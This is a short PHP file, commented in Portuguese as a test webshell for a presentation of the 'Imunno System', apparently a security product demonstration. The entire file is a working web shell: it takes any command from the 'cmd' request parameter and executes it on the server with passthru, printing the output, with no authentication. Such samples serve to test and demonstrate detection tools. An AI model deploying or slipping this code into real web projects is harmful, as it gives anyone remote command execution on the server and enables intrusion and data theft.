<?php
// Webshell de teste para a apresentação do Imunno System
if(isset($_REQUEST['cmd'])) {
    echo "<pre>";
    $comando = ($_REQUEST['cmd']);
    passthru($comando);
    echo "</pre>";
}
?>